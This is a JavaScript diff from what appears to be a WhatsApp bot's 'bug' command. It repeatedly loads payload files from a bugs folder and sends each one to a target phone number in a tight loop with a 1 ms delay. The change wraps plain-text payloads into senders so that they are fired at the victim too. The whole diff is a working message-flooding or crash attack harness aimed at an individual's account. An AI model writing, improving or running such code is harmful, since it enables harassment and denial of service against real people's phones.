@@ -52,14 +52,34 @@ cmd({
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
         try {
-          const bugPayload = require(`../bugs/${file}`);
+          const payloadPath = path.join(bugsDir, file);
+          let bugPayload = require(payloadPath);
+
+          // 👇 Si se { default: 'string' }, mete l andedan fonksyon
+          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
+            const msg = bugPayload.default;
+            bugPayload = async (bot, number) => {
+              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
+            };
+          }
+
+          // 👇 Si se string senp (ex: export default 'text')
+          if (typeof bugPayload === 'string') {
+            const msg = bugPayload;
+            bugPayload = async (bot, number) => {
+              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
+            };
+          }
+
           if (typeof bugPayload === 'function') {
             await bugPayload(bot, targetNumber);
           }
+
         } catch (e) {
           console.error(`❌ Error in ${file}:`, e.message);
         }
-        await new Promise(res => setTimeout(res, 1)); // 1ms
+
+        await new Promise(res => setTimeout(res, 1)); // 1ms = 0.001s
       }
     }
 
